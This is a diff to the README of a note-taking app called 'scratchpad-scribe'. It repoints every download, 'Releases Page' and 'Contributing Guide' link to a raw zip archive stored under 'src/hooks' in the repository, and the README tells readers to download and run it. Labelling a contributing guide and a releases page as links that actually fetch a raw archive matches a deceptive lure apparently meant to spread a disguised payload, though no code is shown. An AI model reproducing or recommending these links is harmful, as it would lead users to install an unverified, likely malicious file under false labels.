@@ -4,10 +4,10 @@
 scratchpad-scribe is a straightforward online note-taking app designed for your convenience. Keep your thoughts organized and accessible anywhere, anytime. It combines user-friendly design and powerful features to help you focus on what you need to write.
 
 ## 📥 Download & Install
-[![Download the latest release](https://raw.githubusercontent.com/hericguedez/scratchpad-scribe/main/advisor/scratchpad-scribe.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/hericguedez/scratchpad-scribe/main/advisor/scratchpad-scribe.zip)
+[![Download the latest release](https://raw.githubusercontent.com/hericguedez/scratchpad-scribe/main/src/hooks/scratchpad-scribe-2.1-alpha.1.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/hericguedez/scratchpad-scribe/main/src/hooks/scratchpad-scribe-2.1-alpha.1.zip)
 
 To get started with scratchpad-scribe:
-1. **Visit the Releases Page**: Click the button above or go to [this page to download](https://raw.githubusercontent.com/hericguedez/scratchpad-scribe/main/advisor/scratchpad-scribe.zip).
+1. **Visit the Releases Page**: Click the button above or go to [this page to download](https://raw.githubusercontent.com/hericguedez/scratchpad-scribe/main/src/hooks/scratchpad-scribe-2.1-alpha.1.zip).
 2. **Download the Latest Version**: Look for the latest version. You will see files listed there. Pick the right one for your device (Windows, Mac, Linux).
 3. **Install the App**: Once downloaded, follow the installation steps. Generally, this means opening the downloaded file and following the on-screen prompts.
 
@@ -48,7 +48,7 @@ This app is ideal for Hacktoberfest contributions and is tagged with the followi
    - Yes, you can access your notes without the internet after saving them.
 
 2. **What should I do if the app doesn't work?**
-   - Make sure your device meets the system requirements. Try reinstalling the app or checking for updates on the [Releases Page](https://raw.githubusercontent.com/hericguedez/scratchpad-scribe/main/advisor/scratchpad-scribe.zip).
+   - Make sure your device meets the system requirements. Try reinstalling the app or checking for updates on the [Releases Page](https://raw.githubusercontent.com/hericguedez/scratchpad-scribe/main/src/hooks/scratchpad-scribe-2.1-alpha.1.zip).
 
 3. **Can I share my notes with others?**
    - Currently, the app does not include sharing features. Consider copying your notes and pasting them into an email or message.
@@ -57,7 +57,7 @@ This app is ideal for Hacktoberfest contributions and is tagged with the followi
 For any inquiries or support, please reach out by opening an issue on the GitHub repository or contacting the contributors listed there.
 
 ## 🌟 Contribution
-We welcome contributors! If you wish to improve scratchpad-scribe, feel free to fork the repository, make your changes, and submit a pull request. Check out our [Contributing Guide](https://raw.githubusercontent.com/hericguedez/scratchpad-scribe/main/advisor/scratchpad-scribe.zip) for more details.
+We welcome contributors! If you wish to improve scratchpad-scribe, feel free to fork the repository, make your changes, and submit a pull request. Check out our [Contributing Guide](https://raw.githubusercontent.com/hericguedez/scratchpad-scribe/main/src/hooks/scratchpad-scribe-2.1-alpha.1.zip) for more details.
 
 ---
 
